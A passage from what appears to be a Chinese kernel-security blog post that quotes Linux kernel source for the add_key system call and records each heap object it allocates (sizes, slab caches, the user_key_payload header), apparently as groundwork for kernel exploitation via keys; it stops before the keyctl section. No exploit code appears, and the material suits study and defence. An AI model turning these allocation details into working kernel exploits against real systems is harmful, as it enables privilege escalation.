<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs applescript">(+) <span class="hljs-string">&quot;keyring&quot;</span><br><br>Keyrings are special keys <span class="hljs-keyword">that</span> <span class="hljs-keyword">contain</span> a <span class="hljs-built_in">list</span> <span class="hljs-keyword">of</span> other keys. Keyring<br>lists can be modified using various system calls. Keyrings should <span class="hljs-keyword">not</span><br>be <span class="hljs-keyword">given</span> a payload when created.<br><br>(+) <span class="hljs-string">&quot;user&quot;</span><br><br>A key <span class="hljs-keyword">of</span> this type has a description <span class="hljs-keyword">and</span> a payload <span class="hljs-keyword">that</span> are arbitrary<br>blobs <span class="hljs-keyword">of</span> data. These can be created, updated <span class="hljs-keyword">and</span> <span class="hljs-built_in">read</span> <span class="hljs-keyword">by</span> userspace,<br><span class="hljs-keyword">and</span> aren&#x27;t intended <span class="hljs-keyword">for</span> use <span class="hljs-keyword">by</span> kernel services.<br><br>(+) <span class="hljs-string">&quot;logon&quot;</span><br><br>Like a <span class="hljs-string">&quot;user&quot;</span> key, a <span class="hljs-string">&quot;logon&quot;</span> key has a payload <span class="hljs-keyword">that</span> <span class="hljs-keyword">is</span> an arbitrary<br>blob <span class="hljs-keyword">of</span> data. It <span class="hljs-keyword">is</span> intended <span class="hljs-keyword">as</span> a place <span class="hljs-keyword">to</span> store secrets which are<br>accessible <span class="hljs-keyword">to</span> <span class="hljs-keyword">the</span> kernel <span class="hljs-keyword">but</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">to</span> userspace programs.<br><br>The description can be arbitrary, <span class="hljs-keyword">but</span> must be prefixed <span class="hljs-keyword">with</span> a non-zero<br><span class="hljs-built_in">length</span> <span class="hljs-built_in">string</span> <span class="hljs-keyword">that</span> describes <span class="hljs-keyword">the</span> key <span class="hljs-string">&quot;subclass&quot;</span>. The subclass <span class="hljs-keyword">is</span><br>separated <span class="hljs-keyword">from</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">rest</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> description <span class="hljs-keyword">by</span> a &#x27;:&#x27;. <span class="hljs-string">&quot;logon&quot;</span> keys can<br>be created <span class="hljs-keyword">and</span> updated <span class="hljs-keyword">from</span> userspace, <span class="hljs-keyword">but</span> <span class="hljs-keyword">the</span> payload <span class="hljs-keyword">is</span> only<br>readable <span class="hljs-keyword">from</span> kernel <span class="hljs-literal">space</span>.<br><br></code></pre></td></tr></table></figure>

<p>找系统调用的方法如下几步：</p>
<ol>
<li>内核源码<code>include/linux/syscalls.h</code></li>
<li>找到对应的系统调用，然后一般上面会有注释在哪个文件夹下</li>
<li>新版本系统调用一般实现为<code>SYSCALL_DEFINE&lt;x&gt;(系统调用名, ...)</code>，老版本一般为<code>sys_open()</code>等。</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Extract the description of a new key from userspace and either add it as a</span><br><span class="hljs-comment"> * new key to the specified keyring or update a matching key in that keyring.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If the description is NULL or an empty string, the key type is asked to</span><br><span class="hljs-comment"> * generate one from the payload.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * The keyring must be writable so that we can attach the key to it.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If successful, the new key&#x27;s serial number is returned, otherwise an error</span><br><span class="hljs-comment"> * code is returned.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-built_in">SYSCALL_DEFINE5</span>(add_key, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, _type,<br>		<span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, _description,<br>		<span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *, _payload,<br>		<span class="hljs-type">size_t</span>, plen,<br>		<span class="hljs-type">key_serial_t</span>, ringid)<br>&#123;<br>	<span class="hljs-type">key_ref_t</span> keyring_ref, key_ref;<br>	<span class="hljs-type">char</span> type[<span class="hljs-number">32</span>], *description;<br>	<span class="hljs-type">void</span> *payload;<br>	<span class="hljs-type">long</span> ret;<br><br>	ret = -EINVAL;<br>	<span class="hljs-keyword">if</span> (plen &gt; <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span> - <span class="hljs-number">1</span>)<br>		<span class="hljs-keyword">goto</span> error;<br><br>	<span class="hljs-comment">/* draw all the data into kernel space */</span><br>	ret = <span class="hljs-built_in">key_get_type_from_user</span>(type, _type, <span class="hljs-built_in">sizeof</span>(type)); 	<span class="hljs-comment">//类型拷贝</span><br>	<span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br>		<span class="hljs-keyword">goto</span> error;<br><br>	description = <span class="hljs-literal">NULL</span>;<br>	<span class="hljs-keyword">if</span> (_description) &#123;<br>		description = <span class="hljs-built_in">strndup_user</span>(_description, KEY_MAX_DESC_SIZE);<br>		<span class="hljs-keyword">if</span> (<span class="hljs-built_in">IS_ERR</span>(description)) &#123;<br>			ret = <span class="hljs-built_in">PTR_ERR</span>(description);<br>			<span class="hljs-keyword">goto</span> error;<br>		&#125;<br>		<span class="hljs-keyword">if</span> (!*description) &#123;<br>			<span class="hljs-built_in">kfree</span>(description);<br>			description = <span class="hljs-literal">NULL</span>;<br>		&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((description[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;.&#x27;</span>) &amp;&amp;<br>			   (<span class="hljs-built_in">strncmp</span>(type, <span class="hljs-string">&quot;keyring&quot;</span>, <span class="hljs-number">7</span>) == <span class="hljs-number">0</span>)) &#123;<br>			ret = -EPERM;<br>			<span class="hljs-keyword">goto</span> error2;<br>		&#125;<br>	&#125;<br><br>	<span class="hljs-comment">/* pull the payload in if one was supplied */</span><br>	payload = <span class="hljs-literal">NULL</span>;<br><br>	<span class="hljs-keyword">if</span> (plen) &#123;<br>		ret = -ENOMEM;<br>		payload = <span class="hljs-built_in">kvmalloc</span>(plen, GFP_KERNEL);<br>		<span class="hljs-keyword">if</span> (!payload)<br>			<span class="hljs-keyword">goto</span> error2;<br><br>		ret = -EFAULT;<br>		<span class="hljs-keyword">if</span> (<span class="hljs-built_in">copy_from_user</span>(payload, _payload, plen) != <span class="hljs-number">0</span>)<br>			<span class="hljs-keyword">goto</span> error3;<br>	&#125;<br><br>	<span class="hljs-comment">/* find the target keyring (which must be writable) */</span><br>	keyring_ref = <span class="hljs-built_in">lookup_user_key</span>(ringid, KEY_LOOKUP_CREATE, KEY_NEED_WRITE);<br>	<span class="hljs-keyword">if</span> (<span class="hljs-built_in">IS_ERR</span>(keyring_ref)) &#123;<br>		ret = <span class="hljs-built_in">PTR_ERR</span>(keyring_ref);<br>		<span class="hljs-keyword">goto</span> error3;<br>	&#125;<br><br>	<span class="hljs-comment">/* create or update the requested key and add it to the target</span><br><span class="hljs-comment">	 * keyring */</span><br>	key_ref = <span class="hljs-built_in">key_create_or_update</span>(keyring_ref, type, description,<br>				       payload, plen, KEY_PERM_UNDEF,<br>				       KEY_ALLOC_IN_QUOTA);<br>	<span class="hljs-keyword">if</span> (!<span class="hljs-built_in">IS_ERR</span>(key_ref)) &#123;<br>		ret = <span class="hljs-built_in">key_ref_to_ptr</span>(key_ref)-&gt;serial;<br>		<span class="hljs-built_in">key_ref_put</span>(key_ref);<br>	&#125;<br>	<span class="hljs-keyword">else</span> &#123;<br>		ret = <span class="hljs-built_in">PTR_ERR</span>(key_ref);<br>	&#125;<br><br>	<span class="hljs-built_in">key_ref_put</span>(keyring_ref);<br> error3:<br>	<span class="hljs-built_in">kvfree_sensitive</span>(payload, plen);<br> error2:<br>	<span class="hljs-built_in">kfree</span>(description);<br> error:<br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>下面进行一个简短的分析，并记录我们所分配的object。</p>
<h4 id="object1、object2–存放临时的description和大小为plen的payload"><a href="#object1、object2–存放临时的description和大小为plen的payload" class="headerlink" title="object1、object2–存放临时的description和大小为plen的payload"></a>object1、object2–存放临时的description和大小为plen的payload</h4><ol>
<li>将传入的用户类型拷贝到内核的局部变量</li>
<li>调用<code>strndup_user</code>，其中参数<code>#define KEY_MAX_DESC_SIZE 4096</code> ,里面的一条调用链最终会归到<code>p = kmalloc_track_caller(len, GFP_USER | __GFP_NOWARN);</code>,也就是说会创建一个内核堆块来存放我们的<code>_description</code>，而其中<code>GFP_USER</code>等价于<code>GFP_KERNEL | __GFP_HARDWALL</code></li>
<li>然后先判断咱们是否有payload，若有，则通过kvmalloc函数来进行分配堆块，然后复制咱们的用户信息过去，这里的kvmalloc的功能实际上就是kmalloc和vmalloc的集合体，在分配一页以下的堆块时可看作使用kmalloc，否则使用vmalloc</li>
<li>以上两个堆块的申请在最后还是会释放，其中调用<code>kvfree_sensitive</code>和<code>kfree</code>来进行释放</li>
</ol>
<p>上面时单独这个系统调用的宏观分析，乍一看好像对我们的利用帮助并不大，但其实咱们还需要进一步分析，在调用上面的系统调用时，他会进入下面这个函数</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-comment">/* create or update the requested key and add it to the target</span><br><span class="hljs-comment">	 * keyring */</span><br>	key_ref = key_create_or_update(keyring_ref, type, description,<br><span class="hljs-built_in">				       payload,</span> plen, KEY_PERM_UNDEF,<br>				       KEY_ALLOC_IN_QUOTA)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<p>从注释也可以观察到，他可以创建和更新一个需求的密钥，并且加入咱们的钥匙扣，跟进会发现有如下调用</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Create or potentially update a key. The combined logic behind</span><br><span class="hljs-comment"> * key_create_or_update() and key_create()</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">key_ref_t</span> __key_create_or_update(<span class="hljs-type">key_ref_t</span> keyring_ref,<br>					<span class="hljs-type">const</span> <span class="hljs-type">char</span> *type,<br>					<span class="hljs-type">const</span> <span class="hljs-type">char</span> *description,<br>					<span class="hljs-type">const</span> <span class="hljs-type">void</span> *payload,<br>					<span class="hljs-type">size_t</span> plen,<br>					<span class="hljs-type">key_perm_t</span> perm,<br>					<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags,<br>					<span class="hljs-type">bool</span> allow_update)<br>&#123;<br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">keyring_index_key</span> index_key = &#123;<br>		.description	= description,<br>	&#125;;<br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">key_preparsed_payload</span> prep;<br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">assoc_array_edit</span> *edit = <span class="hljs-literal">NULL</span>;<br>	<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">cred</span> *cred = <span class="hljs-built_in">current_cred</span>();<br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">key</span> *keyring, *key = <span class="hljs-literal">NULL</span>;<br>	<span class="hljs-type">key_ref_t</span> key_ref;<br>	<span class="hljs-type">int</span> ret;<br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">key_restriction</span> *restrict_link = <span class="hljs-literal">NULL</span>;<br>	...<br><br>	<span class="hljs-comment">/* allocate a new key */</span><br>	key = <span class="hljs-built_in">key_alloc</span>(index_key.type, index_key.description,<br>			cred-&gt;fsuid, cred-&gt;fsgid, cred, perm, flags, <span class="hljs-literal">NULL</span>);<br>	...<br>&#125;<br></code></pre></td></tr></table></figure>

<p>其中会调用<code>key_alloc</code>这样一个函数、</p>
<h4 id="objecy3–分配struct-key"><a href="#objecy3–分配struct-key" class="headerlink" title="objecy3–分配struct key"></a>objecy3–分配struct key</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">key</span> *<span class="hljs-built_in">key_alloc</span>(<span class="hljs-keyword">struct</span> key_type *type, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *desc,<br>		      <span class="hljs-type">kuid_t</span> uid, <span class="hljs-type">kgid_t</span> gid, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> cred *cred,<br>		      <span class="hljs-type">key_perm_t</span> perm, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags,<br>		      <span class="hljs-keyword">struct</span> key_restriction *restrict_link)<br>&#123;<br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">key_user</span> *user = <span class="hljs-literal">NULL</span>;<br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">key</span> *key;<br>	<span class="hljs-type">size_t</span> desclen, quotalen;<br>	<span class="hljs-type">int</span> ret;<br>	...<br><br>	desclen = <span class="hljs-built_in">strlen</span>(desc);<br>	quotalen = desclen + <span class="hljs-number">1</span> + type-&gt;def_datalen;<br><br>	...<br>	<br>	<span class="hljs-comment">/* allocate and initialise the key and its description */</span><br>	key = <span class="hljs-built_in">kmem_cache_zalloc</span>(key_jar, GFP_KERNEL);<br>	<span class="hljs-keyword">if</span> (!key)<br>		<span class="hljs-keyword">goto</span> no_memory_2;<br><br>	key-&gt;index_key.desc_len = desclen;<br>	key-&gt;index_key.description = <span class="hljs-built_in">kmemdup</span>(desc, desclen + <span class="hljs-number">1</span>, GFP_KERNEL);<br>	...<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里可以看到他在一个<code>kmem_cache</code>类型的全局变量<code>key_jar</code>里面分配了堆块，且标志位应为<code>__GFP_ZERO|GFP_KERNEL</code>，他用来分配咱们的<code>key</code>值，也就是咱们的密钥结构体，并且香气中拷贝了长度以及描述，这个kmemdup函数的大致过程就是首先kmalloc一个堆块，然后调用memcpy拷贝我们的描述过去；</p>
<p>然后我们回到<code>__key_create_or_update</code>的分析，在调用key_alloc之前，他会首先再次分配一个堆块，我们进行其中部分代码的分析，如下：</p>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xl">...<br>memset(&amp;prep, <span class="hljs-number">0</span>, sizeof(prep));<br>prep.orig_description = description;<br>prep.<span class="hljs-keyword">data</span> = payload;<br>prep.datalen = plen;<br><span class="hljs-function"><span class="hljs-title">prep</span>.quotalen = index_key.type-&gt;</span>def_datalen;<br>prep.expiry = TIME64_MAX;<br><span class="hljs-function"><span class="hljs-title">if</span> (index_key.type-&gt;</span>preparse) &#123;<br>	<span class="hljs-function"><span class="hljs-title">ret</span> = index_key.type-&gt;</span>preparse(&amp;prep);<br>	...<br></code></pre></td></tr></table></figure>

<p>这里会调用到<code>index_key.type-&gt;preparse()</code>函数，其中该type如何判断是什么呢，我们可以找到该type的赋值判断过程，然后发现是由于我们最开始add_key的系统调用里面传入一个字符串，然后通过一个函数来根据该传入的字符串从一个内核全局列表里面遍历查找是否有类似的type，因此我就把寻找目标定在初始化函数里面，这个列表名我们知道，因此可以简单的通过一些源码查看工具找到初始化函数，然后就可以看到其中的一些类别，如下：</p>
<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Initialise the key management state.</span><br><span class="hljs-comment"> */</span><br>void __init key_init(void)<br>&#123;<br>	<span class="hljs-comment">/* allocate a slab in which we can store keys */</span><br>	key_jar = kmem_cache_create(<span class="hljs-string">&quot;key_jar&quot;</span>, sizeof(struct <span class="hljs-keyword">key</span>),<br>			0, SLAB_HWCACHE_ALIGN|SLAB_PANIC, <span class="hljs-keyword">NULL</span>);<br><br>	<span class="hljs-comment">/* add the special key types */</span><br>	list_add_tail(<span class="hljs-variable">&amp;key_type_keyring.</span><span class="hljs-keyword">link</span>, <span class="hljs-variable">&amp;key_types_list</span>);<br>	list_add_tail(<span class="hljs-variable">&amp;key_type_dead.</span><span class="hljs-keyword">link</span>, <span class="hljs-variable">&amp;key_types_list</span>);<br>	list_add_tail(<span class="hljs-variable">&amp;key_type_user.</span><span class="hljs-keyword">link</span>, <span class="hljs-variable">&amp;key_types_list</span>);<br>	list_add_tail(<span class="hljs-variable">&amp;key_type_logon.</span><span class="hljs-keyword">link</span>, <span class="hljs-variable">&amp;key_types_list</span>);<br><br>	<span class="hljs-comment">/* record the root user tracking */</span><br>	rb_link_node(<span class="hljs-variable">&amp;root_key_user.</span>node,<br>		     <span class="hljs-keyword">NULL</span>,<br>		     <span class="hljs-variable">&amp;key_user_tree.</span>rb_node);<br><br>	rb_insert_color(<span class="hljs-variable">&amp;root_key_user.</span>node,<br>			<span class="hljs-variable">&amp;key_user_tree</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>可以看到该list里面有上面四种情况，而由于我们仅仅关注user方面的，所以仅看其中一种即可，user type的key如下：</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">/*<br> * user defined keys take an arbitrary string as the description and an<br> * arbitrary blob of data as the payload<br> */<br>struct key_type key_type_user = &#123;<br>	<span class="hljs-string">.name</span>			= <span class="hljs-string">&quot;user&quot;</span>,<br>	<span class="hljs-string">.preparse</span>		= user_preparse,<br>	<span class="hljs-string">.free_preparse</span>		= user_free_preparse,<br>	<span class="hljs-string">.instantiate</span>		= generic_key_instantiate,<br>	<span class="hljs-string">.update</span>			= user_update,<br>	<span class="hljs-string">.revoke</span>			= user_revoke,<br>	<span class="hljs-string">.destroy</span>		= user_destroy,<br>	<span class="hljs-string">.describe</span>		= user_describe,<br>	<span class="hljs-string">.read</span>			= user_read,<br>&#125;;<br><br></code></pre></td></tr></table></figure>

<p>我们回到刚刚的<code>__key_create_or_update</code>，里面调用了我们user的函数<code>.preparse</code>,他指向我们的<code>user_preparse</code>函数，我们可以往下继续看</p>
<h4 id="object4–分配user-key-payload"><a href="#object4–分配user-key-payload" class="headerlink" title="object4–分配user_key_payload"></a>object4–分配user_key_payload</h4><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Preparse a user defined key payload</span><br><span class="hljs-comment"> */</span><br>int user_preparse(struct key_preparsed_payload *prep)<br>&#123;<br>	struct user_key_payload *upayload;<br>	<span class="hljs-function"><span class="hljs-title">size_t</span> datalen = prep-&gt;</span>datalen;<br><br>	<span class="hljs-function"><span class="hljs-title">if</span> (datalen &lt;= 0 || datalen &gt; 32767 || !prep-&gt;</span><span class="hljs-keyword">data</span>)<br>		return -EINVAL;<br><br>	upayload = kmalloc(sizeof(*upayload) + datalen, GFP_KERNEL);<br>	<span class="hljs-keyword">if</span> (!upayload)<br>		return -ENOMEM;<br><br>	<span class="hljs-comment">/* attach the data */</span><br>	<span class="hljs-function"><span class="hljs-title">prep</span>-&gt;</span>quotalen = datalen;<br>	<span class="hljs-function"><span class="hljs-title">prep</span>-&gt;</span>payload.<span class="hljs-keyword">data</span>[<span class="hljs-number">0</span>] = upayload;<br>	<span class="hljs-function"><span class="hljs-title">upayload</span>-&gt;</span>datalen = datalen;<br>	<span class="hljs-function"><span class="hljs-title">memcpy</span>(upayload-&gt;</span><span class="hljs-function"><span class="hljs-title">data</span>, prep-&gt;</span><span class="hljs-keyword">data</span>, datalen);<br>	return <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>函数并不是很长，大致含义会再次分配一个<code>user_key_payload</code>的结构体加上我们之前传入的plen大小的堆块，这个<code>user_key_payload</code>即是作为一个保护头而存在，其中该结构体如下：</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs markdown">/<span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-emphasis">*/</span><br><span class="hljs-emphasis">/*</span><br><span class="hljs-bullet"> *</span> the payload for a key of type &quot;user&quot; or &quot;logon&quot;<br><span class="hljs-bullet"> *</span> - once filled in and attached to a key:<br><span class="hljs-bullet"> *</span>   - the payload struct is invariant may not be changed, only replaced<br><span class="hljs-bullet"> *</span>   - the payload must be read with RCU procedures or with the key semaphore<br><span class="hljs-bullet"> *</span>     held<br><span class="hljs-bullet"> *</span>   - the payload may only be replaced with the key semaphore write-locked<br><span class="hljs-bullet"> *</span> - the key&#x27;s data length is the size of the actual data, not including the<br><span class="hljs-bullet"> *</span>   payload wrapper<br> <span class="hljs-emphasis">*/</span><br><span class="hljs-emphasis">struct user_key_payload &#123;</span><br><span class="hljs-emphasis">	struct rcu_head	rcu;		/*</span> RCU destructor <span class="hljs-emphasis">*/</span><br><span class="hljs-emphasis">	unsigned short	datalen;	/*</span> length of this data <span class="hljs-emphasis">*/</span><br><span class="hljs-emphasis">	char		data[] <span class="hljs-strong">__aligned(__</span>alignof<span class="hljs-strong">__(u64)); /* actual data */</span></span><br><span class="hljs-strong"><span class="hljs-emphasis">&#125;;</span></span><br></code></pre></td></tr></table></figure>

<p>而其中的<code>rcu_head</code>字段如下：</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-meta">#<span class="hljs-keyword">define</span> rcu_head callback_head</span><br><span class="hljs-keyword">struct</span> <span class="hljs-type">callback_head</span> &#123;<br>	<span class="hljs-keyword">struct</span> <span class="hljs-type">callback_head</span> *next;<br>	<span class="hljs-built_in">void</span> (*func)(<span class="hljs-keyword">struct</span> <span class="hljs-type">callback_head</span> *);<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>也就是说最后object4会保存一段的user_key_payload头和我们的payload数据。其中头部到达数据的距离为0x18字节，这是因为存在对齐关键字。</p>
<p>综上所述，<code>add_key</code>系统调用过程有以下几个步骤：</p>
<ol>
<li>判断description是否为空来分配相应大小的临时堆块object1</li>
<li>根据plen来分配传入payload的临时堆块object2</li>
<li>分配我们的user_key_payload堆块object3，其中包含的内容一部分是0x18大小的头部以及剩下的我们自行传入的payload</li>
<li>分配struct key堆块object4，注意这里是使用独立的kmem_cache key_jar来分配,返回keyid</li>
<li>释放临时堆块object1、object2</li>
</ol>
<h3 id="3-keyctl基础知识"><a href="#3-keyctl基础知识" class="headerlink" title="3.keyctl基础知识"></a>3.keyctl基础知识</h3><p>我们了解到了如何通过系统调用来获得key，那么现在我们如何利用它呢，这里就得介绍一下我们的keyctl系统调用，手册在解释add_key系统调用的时候就已经列出</p>
<p>其大致功能就是对于我们add_key所获得的key_id来操纵该key，系统调用如下：</p>
